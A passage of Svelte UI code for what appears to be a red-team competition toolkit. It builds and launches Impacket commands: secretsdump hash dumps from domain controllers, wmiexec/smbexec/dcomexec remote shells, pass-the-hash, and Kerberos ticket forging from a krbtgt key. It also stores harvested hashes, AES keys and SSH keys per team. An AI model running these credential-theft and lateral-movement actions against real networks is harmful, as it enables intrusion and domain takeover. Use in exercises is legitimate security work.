          </div>

          <div class="min-w-0 rounded-md border border-white/10 bg-white/[0.035] p-5">
            <div class="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
              <div>
                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-lime-200/60">Actions</p>
                <h2 class="mt-2 text-xl font-semibold text-white">{easyMode.teamName || "No team selected"}</h2>
              </div>
              <div class="rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm text-white/55">
                {easyCredentialOptions.length} creds / {easyTargets.length} targets
              </div>
            </div>

            {#if easyLoading}
              <p class="mt-5 rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm text-white/55">Loading Easy Mode data...</p>
            {/if}
            {#if easyError}
              <p class="mt-5 rounded-md border border-rose-300/20 bg-rose-300/10 px-3 py-2 text-sm text-rose-100">{easyError}</p>
            {/if}

            <div class="mt-5 grid gap-3 lg:grid-cols-2">
              <div class="rounded-md border border-white/10 bg-black/20 p-4">
                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-lime-200/60">Dump</p>
                <h3 class="mt-2 text-lg font-semibold text-white">Dump DC hashes</h3>
                <p class="mt-2 text-sm leading-6 text-white/55">
                  Runs secretsdump with <code class="rounded bg-black/30 px-1 text-teal-100">-just-dc</code> against the picked DC and imports results.
                </p>
                <Button
                  type="button"
                  disabled={easyRunning || !selectedEasyDc || !selectedEasyCredential}
                  class="mt-4 bg-lime-200 text-slate-950 hover:bg-lime-100"
                  onclick={handleEasyDumpHashes}
                >
                  {easyRunning ? "Working..." : "Dump hashes"}
                </Button>
              </div>

              <div class="rounded-md border border-white/10 bg-black/20 p-4">
                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-lime-200/60">Shell</p>
                <h3 class="mt-2 text-lg font-semibold text-white">Open wmiexec</h3>
                <p class="mt-2 text-sm leading-6 text-white/55">
                  Launches a local terminal with the picked credential and shell target.
                </p>
                <Button
                  type="button"
                  disabled={easyRunning || !selectedEasyShellTarget || !selectedEasyCredential}
                  class="mt-4 bg-teal-200 text-slate-950 hover:bg-teal-100"
                  onclick={handleEasyLaunchWmiexec}
                >
                  {easyRunning ? "Working..." : "Open shell"}
                </Button>
              </div>
            </div>

            <div class="mt-5 grid gap-3 text-sm text-white/60">
              <div class="rounded-md border border-white/10 bg-black/20 p-4">
                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-white/45">Selected context</p>
                <div class="mt-3 grid gap-2 font-mono text-xs text-white/65">
                  <span>DC: {selectedEasyDc ? `${easyDcFqdn} (${selectedEasyDc.ip})` : "not selected"}</span>
                  <span>Shell target: {selectedEasyShellTarget ? `${selectedEasyShellTarget.hostname || selectedEasyShellTarget.ip} (${selectedEasyShellTarget.ip})` : "not selected"}</span>
                  <span>Credential: {selectedEasyCredential ? credentialPickerLabel(selectedEasyCredential) : "not selected"}</span>
                </div>
              </div>
            </div>

            {#if easyOutput}
              <div class="mt-4">
                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-lime-200/60">Last result</p>
                <pre class="mt-2 max-h-72 overflow-auto whitespace-pre-wrap rounded-md border border-white/10 bg-black/35 p-4 font-mono text-xs leading-5 text-white/70">{easyOutput}</pre>
              </div>
            {/if}
          </div>
        </section>
      {:else if activeTab === "command"}
        <section class="grid min-w-0 gap-5 xl:grid-cols-[minmax(0,440px)_minmax(0,1fr)]">
          <div class="min-w-0 rounded-md border border-white/10 bg-[#0d1316]/90 p-5">
            <Radar class="h-6 w-6 text-teal-100" />
            <h2 class="mt-4 text-xl font-semibold text-white">Command</h2>
            <p class="mt-2 text-sm leading-6 text-white/60">
              Build common Impacket commands from known teams, targets, tickets, and credentials.
            </p>

            <div class="mt-6 grid gap-3">
              <label class="grid gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Team</span>
                <select
                  bind:value={commandForm.teamName}
                  class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-teal-200/45"
                  disabled={teams.length === 0}
                >
                  {#each teams as team (team.name)}
                    <option class="bg-[#0d1316]" value={team.name}>{team.name}</option>
                  {/each}
                </select>
              </label>

              <label class="grid gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Command</span>
                <select
                  bind:value={commandForm.commandKind}
                  class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-teal-200/45"
                >
                  <option class="bg-[#0d1316]" value="secretsdump">Credential dump: secretsdump</option>
                  <option class="bg-[#0d1316]" value="wmiexec">Interactive shell: wmiexec</option>
                  <option class="bg-[#0d1316]" value="smbexec">Interactive shell: smbexec</option>
                  <option class="bg-[#0d1316]" value="dcomexec">Interactive shell: dcomexec</option>
                  <option class="bg-[#0d1316]" value="getTGT">Kerberos cache: getTGT</option>
                  <option class="bg-[#0d1316]" value="ticketer">Kerberos cache: ticketer</option>
                </select>
              </label>

              <label class="grid gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Impacket command style</span>
                <select
                  bind:value={commandForm.impacketStyle}
                  class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-teal-200/45"
                >
                  <option class="bg-[#0d1316]" value="kali">Kali package: impacket-*</option>
                  <option class="bg-[#0d1316]" value="pythonScripts">Python scripts: *.py</option>
                  <option class="bg-[#0d1316]" value="custom">Custom command names</option>
                </select>
              </label>

              {#if commandForm.impacketStyle === "custom"}
                <div class="grid min-w-0 gap-3 2xl:grid-cols-3">
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">secretsdump</span>
                    <input
                      bind:value={commandForm.customSecretsdump}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="impacket-secretsdump"
                    />
                  </label>
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">getTGT</span>
                    <input
                      bind:value={commandForm.customGetTGT}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="getTGT.py"
                    />
                  </label>
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">ticketer</span>
                    <input
                      bind:value={commandForm.customTicketer}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="ticketer.py"
                    />
                  </label>
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">wmiexec</span>
                    <input
                      bind:value={commandForm.customWmiexec}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="impacket-wmiexec"
                    />
                  </label>
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">smbexec</span>
                    <input
                      bind:value={commandForm.customSmbexec}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="impacket-smbexec"
                    />
                  </label>
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">dcomexec</span>
                    <input
                      bind:value={commandForm.customDcomexec}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="impacket-dcomexec"
                    />
                  </label>
                </div>
              {/if}

              {#if commandForm.commandKind === "dcomexec"}
                <label class="grid gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">DCOM object</span>
                  <select
                    bind:value={commandForm.dcomObject}
                    class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-teal-200/45"
                  >
                    <option class="bg-[#0d1316]" value="ShellBrowserWindow">ShellBrowserWindow</option>
                    <option class="bg-[#0d1316]" value="MMC20">MMC20</option>
                    <option class="bg-[#0d1316]" value="ShellWindows">ShellWindows</option>
                  </select>
                </label>
              {/if}

              {#if usesTarget}
                <label class="grid gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Target</span>
                  <select
                    bind:value={commandForm.targetId}
                    class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-teal-200/45"
                  >
                    <option class="bg-[#0d1316]" value="">Choose target</option>
                    {#each commandTargets as target (target.id)}
                      <option class="bg-[#0d1316]" value={String(target.id)}>
                        {target.hostname} / {target.ip}{target.domainName ? ` / ${target.domainName}` : ""}
                      </option>
                    {/each}
                    <option class="bg-[#0d1316]" value="manual">Manual target</option>
                  </select>
                </label>

                {#if commandForm.targetId === "manual"}
                  <label class="grid gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Manual target</span>
                    <input
                      bind:value={commandForm.manualTarget}
                      class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="dc01.corp.local or 10.10.1.5"
                    />
                  </label>
                {/if}
              {/if}

              <div class="grid min-w-0 gap-3">
                <label class="grid min-w-0 gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Auth</span>
                  {#if usesTarget}
                    <select
                      bind:value={commandForm.authMode}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-teal-200/45"
                    >
                      <option class="bg-[#0d1316]" value="password">Password</option>
                      <option class="bg-[#0d1316]" value="hash">Pass the hash</option>
                      <option class="bg-[#0d1316]" value="kerberos">Kerberos</option>
                    </select>
                  {:else}
                    <select
                      bind:value={commandForm.ticketAuthMode}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-teal-200/45"
                    >
                      <option class="bg-[#0d1316]" value="password">Password</option>
                      <option class="bg-[#0d1316]" value="hash">NTLM hash</option>
                      <option class="bg-[#0d1316]" value="aes">User AES key</option>
                    </select>
                  {/if}
                </label>

                {#if commandForm.commandKind === "secretsdump"}
                <div class="grid gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Advanced secretsdump options</span>
                  <label class="flex items-center gap-3 rounded-md border border-white/10 bg-black/20 px-3 py-3 text-sm text-white/70">
                    <input bind:checked={commandForm.justDc} type="checkbox" class="h-4 w-4 accent-teal-200" />
                    <span>
                      <span class="font-mono text-teal-100">-just-dc</span>
                      <span class="text-white/45"> dump domain controller secrets only</span>
                    </span>
                  </label>
                  <label class="flex items-center gap-3 rounded-md border border-white/10 bg-black/20 px-3 py-3 text-sm text-white/70">
                    <input bind:checked={commandForm.useVss} type="checkbox" class="h-4 w-4 accent-teal-200" />
                    <span>
                      <span class="font-mono text-teal-100">-use-vss</span>
                      <span class="text-white/45"> use VSS for NTDS extraction</span>
                    </span>
                  </label>
                </div>
                {/if}
              </div>

              <div class="grid gap-2 rounded-md border border-white/10 bg-black/20 p-3">
                <div class="flex flex-col gap-1 sm:flex-row sm:items-center sm:justify-between">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Saved credentials</span>
                  <span class="text-xs text-white/40">{commandCredentialOptions.length} usable</span>
                </div>
                <p class="text-xs text-white/35">Newest matches are listed first.</p>
                {#if commandCredentialsLoading}
                  <p class="text-sm text-white/50">Loading credentials...</p>
                {:else if commandCredentialOptions.length === 0}
                  <p class="text-sm text-white/45">No saved credentials match this command and auth mode.</p>
                {:else}
                  <div class="grid gap-2">
                    {#each commandCredentialOptions as credential (credential.id)}
                      <button
                        type="button"
                        class="rounded-md border border-white/10 bg-white/[0.035] px-3 py-2 text-left text-sm transition hover:border-teal-300/45 hover:bg-teal-300/10"
                        onclick={() => handleUseCredential(credential)}
                      >
                        <span class="block font-mono text-teal-100">
                          {credentialIdentity(credential)}
                        </span>
                        <span class="mt-1 block text-xs text-white/45">
                          {credential.secretType} / {credentialSecretHint(credential)} / added {credentialAddedLabel(credential)}
                        </span>
                        {#if credentialContextLabel(credential)}
                          <span class="mt-1 block text-xs text-white/35">{credentialContextLabel(credential)}</span>
                        {/if}
                      </button>
                    {/each}
                  </div>
                {/if}
              </div>

              <div class="grid min-w-0 gap-3 2xl:grid-cols-2">
                <label class="grid min-w-0 gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Domain</span>
                  <input
                    bind:value={commandForm.domain}
                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                    placeholder="CORP or corp.local"
                  />
                </label>

                <label class="grid min-w-0 gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Username</span>
                  <input
                    bind:value={commandForm.username}
                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                    placeholder="administrator"
                  />
                </label>
              </div>

              {#if commandForm.commandKind === "ticketer"}
                <div class="grid min-w-0 gap-3 2xl:grid-cols-2">
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Domain SID</span>
                    <input
                      bind:value={commandForm.domainSid}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="S-1-5-21-..."
                    />
                  </label>
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">User RID</span>
                    <input
                      bind:value={commandForm.userId}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="optional, e.g. 500"
                    />
                  </label>
                </div>
                <label class="grid gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">krbtgt AES key</span>
                  <input
                    bind:value={commandForm.krbtgtAesKey}
                    type="password"
                    class="rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                    placeholder="from saved credentials or secretsdump output"
                  />
                </label>
                <div class="grid min-w-0 gap-3 2xl:grid-cols-2">
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Groups</span>
                    <input
                      bind:value={commandForm.groups}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="optional"
                    />
                  </label>
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Duration</span>
                    <input
                      bind:value={commandForm.duration}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="optional"
                    />
                  </label>
                </div>
                <label class="grid gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Extra SID</span>
                  <input
                    bind:value={commandForm.extraSid}
                    class="rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                    placeholder="optional"
                  />
                </label>
              {:else if commandForm.commandKind === "getTGT" && commandForm.ticketAuthMode === "password"}
                <label class="grid gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Password</span>
                  <input
                    bind:value={commandForm.password}
                    type="password"
                    class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                    placeholder="stored only in this form"
                  />
                </label>
              {:else if usesTarget && commandForm.authMode === "password"}
                <label class="grid gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Password</span>
                  <input
                    bind:value={commandForm.password}
                    type="password"
                    class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                    placeholder="stored only in this form"
                  />
                </label>
              {:else if (commandForm.commandKind === "getTGT" && commandForm.ticketAuthMode === "hash") || (usesTarget && commandForm.authMode === "hash")}
                <div class="grid min-w-0 gap-3 2xl:grid-cols-2">
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">LM hash</span>
                    <input
                      bind:value={commandForm.lmHash}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="optional"
                    />
                  </label>
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">NTLM hash</span>
                    <input
                      bind:value={commandForm.ntHash}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="required"
                    />
                  </label>
                </div>
              {:else if commandForm.commandKind === "getTGT" && commandForm.ticketAuthMode === "aes"}
                <label class="grid gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">User AES key</span>
                  <input
                    bind:value={commandForm.aesKey}
                    type="password"
                    class="rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                    placeholder="user account AES key"
                  />
                </label>
              {:else if usesTarget && commandForm.authMode === "kerberos"}
                <div class="grid gap-3">
                  <label class="flex items-center gap-3 rounded-md border border-white/10 bg-black/20 px-3 py-3 text-sm text-white/70">
                    <input bind:checked={commandForm.useKerberosCache} type="checkbox" class="h-4 w-4 accent-teal-200" />
                    Use current Kerberos cache (-k -no-pass)
                  </label>
                  <label class="grid gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">AES key</span>
                    <input
                      bind:value={commandForm.aesKey}
                      class="rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="optional"
                    />
                  </label>
                </div>
              {/if}

              {#if commandForm.commandKind === "getTGT" || commandForm.commandKind === "ticketer"}
                <div class="grid min-w-0 gap-3 2xl:grid-cols-2">
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Cache path</span>
                    <input
                      bind:value={commandForm.cachePath}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder={defaultKerberosCachePath}
                    />
                  </label>
                  <label class="grid min-w-0 gap-2">
                    <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Expires at</span>
                    <input
                      bind:value={commandForm.expiresAt}
                      class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                      placeholder="optional"
                    />
                  </label>
                </div>
                <label class="grid gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Notes</span>
                  <textarea
                    bind:value={commandForm.notes}
                    class="min-h-20 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                    placeholder="optional"
                  ></textarea>
                </label>
              {/if}

              <label class="grid gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">DC IP / KDC host</span>
                <input
                  bind:value={commandForm.kdcHost}
                  class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-teal-200/45"
                  placeholder="optional, useful for domain/Kerberos"
                />
              </label>
            </div>
          </div>

          <div class="min-w-0 rounded-md border border-white/10 bg-white/[0.035] p-5">
            <div class="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
              <div>
                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-teal-200/60">Preview</p>
                <h2 class="mt-2 text-xl font-semibold text-white">{commandTitle}</h2>
              </div>
              <div class="flex flex-wrap gap-2">
                {#if commandForm.commandKind === "secretsdump"}
                  <Button type="button" disabled={commandRunning} class="bg-lime-200 text-slate-950 hover:bg-lime-100" onclick={handleRunSecretsdump}>
                    {commandRunning ? "Running..." : "Run and import"}
                  </Button>
                {:else if isInteractiveCommand}
                  <Button type="button" disabled={commandRunning} class="bg-lime-200 text-slate-950 hover:bg-lime-100" onclick={handleLaunchInteractiveCommand}>
                    {commandRunning ? "Launching..." : "Launch terminal"}
                  </Button>
                {:else if commandForm.commandKind === "getTGT" || commandForm.commandKind === "ticketer"}
                  <Button type="button" disabled={commandRunning} class="bg-lime-200 text-slate-950 hover:bg-lime-100" onclick={handleRunKerberosTicket}>
                    {commandRunning ? "Running..." : "Run and save"}
                  </Button>
                  <Button type="button" class="border border-white/10 bg-white/[0.06] text-white hover:bg-white/[0.1]" onclick={handleSaveKerberosCache}>
                    {kerberosCacheSaved ? "Saved" : "Save cache"}
                  </Button>
                  <Button type="button" class="border border-white/10 bg-white/[0.06] text-white hover:bg-white/[0.1]" onclick={handleCopyKerberosEnv}>
                    Copy env
                  </Button>
                {/if}
                <Button type="button" class="bg-teal-200 text-slate-950 hover:bg-teal-100" onclick={handleCopyCommand}>
                  {commandCopied ? "Copied" : "Copy"}
                </Button>
              </div>
            </div>

            {#if commandTargetsLoading}
              <p class="mt-5 rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm text-white/55">Loading targets...</p>
            {/if}
            {#if commandError}
              <p class="mt-5 rounded-md border border-rose-300/20 bg-rose-300/10 px-3 py-2 text-sm text-rose-100">{commandError}</p>
            {/if}

            <pre class="mt-5 min-h-40 overflow-x-auto whitespace-pre-wrap rounded-md border border-white/10 bg-black/40 p-4 font-mono text-sm leading-6 text-teal-100">{commandPreview}</pre>

            {#if commandRunOutput}
              <div class="mt-4">
                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-lime-200/60">Run output</p>
                <pre class="mt-2 max-h-64 overflow-auto whitespace-pre-wrap rounded-md border border-white/10 bg-black/35 p-4 font-mono text-xs leading-5 text-white/70">{commandRunOutput}</pre>
              </div>
            {/if}

            <div class="mt-5 grid gap-3 text-sm text-white/60">
              {#if commandForm.commandKind === "secretsdump"}
                <p>
                  <span class="font-semibold text-white/80">Local SAM/LSA</span>
                  uses the default secretsdump behavior against the selected host.
                </p>
                <p>
                  <span class="font-semibold text-white/80">Kerberos</span>
                  uses a selected or exported cache with <code class="rounded bg-black/30 px-1 text-teal-100">-k -no-pass</code>.
                  Use a hostname or FQDN target; keep the DC IP in <code class="rounded bg-black/30 px-1 text-teal-100">-dc-ip</code>.
                </p>
              {:else if isInteractiveCommand}
                <p>
                  <span class="font-semibold text-white/80">{commandForm.commandKind}</span>
                  opens a local Linux terminal titled <code class="rounded bg-black/30 px-1 text-teal-100">team:box</code>.
                  cfc-tk hands off the shell and does not capture its output.
                </p>
                <p>
                  <span class="font-semibold text-white/80">Kerberos</span>
                  should use a hostname or FQDN target. Use <code class="rounded bg-black/30 px-1 text-teal-100">-dc-ip</code> for the KDC.
                </p>
              {:else if commandForm.commandKind === "getTGT"}
                <p>
                  <span class="font-semibold text-white/80">getTGT</span>
                  contacts the KDC and writes a reusable cache for the selected account.
                </p>
              {:else}
                <p>
                  <span class="font-semibold text-white/80">ticketer</span>
                  creates a local cache from the krbtgt key and the ticket recipe.
                </p>
              {/if}
            </div>

            <div class="mt-6 border-t border-white/10 pt-5">
              <div class="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between">
                <div>
                  <p class="text-xs font-semibold uppercase tracking-[0.22em] text-teal-200/60">Saved caches</p>
                  <p class="mt-1 text-sm text-white/55">Cache files stay on disk; this list stores paths and recipe metadata.</p>
                </div>
                {#if selectedKerberosCache}
                  <Button type="button" class="border border-white/10 bg-white/[0.06] text-white hover:bg-white/[0.1]" onclick={() => handleUseKerberosCache(selectedKerberosCache)}>
                    Use match
                  </Button>
                {/if}
              </div>

              {#if kerberosCachesLoading}
                <p class="mt-4 rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm text-white/55">Loading caches...</p>
              {:else if kerberosCaches.length === 0}
                <p class="mt-4 rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm text-white/45">No saved Kerberos caches yet.</p>
              {:else}
                <div class="mt-4 grid gap-3">
                  {#each kerberosCaches as cache (cache.id)}
                    <div class="rounded-md border border-white/10 bg-black/20 p-3">
                      <div class="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
                        <div class="min-w-0">
                          <p class="break-words font-mono text-sm text-teal-100">{cache.domain}/{cache.username}</p>
                          <p class="mt-1 break-words font-mono text-xs text-white/45">{cache.cachePath}</p>
                          <p class="mt-2 text-xs text-white/45">
                            {cache.method} / {cache.status.replace("_", " ")}{cache.expiresAt ? ` / expires ${cache.expiresAt}` : ""}
                          </p>
                        </div>
                        <Button type="button" class="border border-white/10 bg-white/[0.06] text-white hover:bg-white/[0.1]" onclick={() => handleUseKerberosCache(cache)}>
                          Use
                        </Button>
                      </div>
                    </div>
                  {/each}
                </div>
              {/if}
            </div>
          </div>
        </section>
      {:else if activeTab === "notes"}
        <section class="grid gap-5 lg:grid-cols-[0.8fr_1.2fr]">
          <div class="rounded-md border border-white/10 bg-[#0d1316]/90 p-5">
            <NotebookPen class="h-6 w-6 text-lime-100" />
            <h2 class="mt-4 text-xl font-semibold text-white">Notes</h2>
            <p class="mt-2 text-sm leading-6 text-white/60">
              Keep quick field notes here while the workspace stays quiet and readable.
            </p>
          </div>
          <div class="rounded-md border border-white/10 bg-white/[0.035] p-5">
            <textarea
              class="min-h-[360px] w-full resize-y rounded-md border border-white/10 bg-black/30 p-4 text-sm leading-6 text-white outline-none transition placeholder:text-white/30 focus:border-lime-200/50"
              placeholder="Drop notes, observations, or reminders here."
            ></textarea>
          </div>
        </section>
      {:else}
        <section class="grid min-w-0 gap-5 xl:grid-cols-[minmax(0,420px)_minmax(0,1fr)]">
          <div class="min-w-0 rounded-md border border-white/10 bg-[#0d1316]/90 p-5">
            <KeyRound class="h-6 w-6 text-rose-100" />
            <h2 class="mt-4 text-xl font-semibold text-white">Credentials</h2>
            <p class="mt-2 text-sm leading-6 text-white/60">
              Load a team credential database, then add Windows or Linux material as you pull it from secretsdump output or manual triage.
            </p>

            <label class="mt-6 grid gap-2">
              <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Team database</span>
              <select
                bind:value={selectedCredentialTeam}
                class="rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-rose-200/45"
                disabled={teams.length === 0}
              >
                {#each teams as team (team.name)}
                  <option class="bg-[#0d1316]" value={team.name}>{team.name}</option>
                {/each}
              </select>
            </label>

            <form class="mt-6 grid min-w-0 gap-3" onsubmit={handleAddCredential}>
              <div class="grid min-w-0 gap-3 2xl:grid-cols-2">
                <label class="grid min-w-0 gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">OS</span>
                  <select
                    bind:value={credentialForm.os}
                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-rose-200/45"
                  >
                    <option class="bg-[#0d1316]" value="windows">Windows</option>
                    <option class="bg-[#0d1316]" value="linux">Linux</option>
                  </select>
                </label>

                <label class="grid min-w-0 gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Type</span>
                  <select
                    bind:value={credentialForm.secretType}
                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition focus:border-rose-200/45"
                  >
                    <option class="bg-[#0d1316]" value="password">Password</option>
                    <option class="bg-[#0d1316]" value="ntlm">NTLM hash</option>
                    <option class="bg-[#0d1316]" value="kerberos-aes">Kerberos AES hash</option>
                    <option class="bg-[#0d1316]" value="kerberos-ntlm">Kerberos NTLM hash</option>
                    <option class="bg-[#0d1316]" value="ssh-key">SSH key</option>
                    <option class="bg-[#0d1316]" value="other">Other</option>
                  </select>
                </label>
              </div>

              <label class="grid min-w-0 gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Username</span>
                <input
                  bind:value={credentialForm.username}
                  required
                  class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-rose-200/45"
                  placeholder="DOMAIN\\user or user"
                />
              </label>

              <div class="grid min-w-0 gap-3 2xl:grid-cols-2">
                <label class="grid min-w-0 gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Domain</span>
                  <input
                    bind:value={credentialForm.domain}
                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-rose-200/45"
                    placeholder="optional"
                  />
                </label>
                <label class="grid min-w-0 gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">RID</span>
                  <input
                    bind:value={credentialForm.rid}
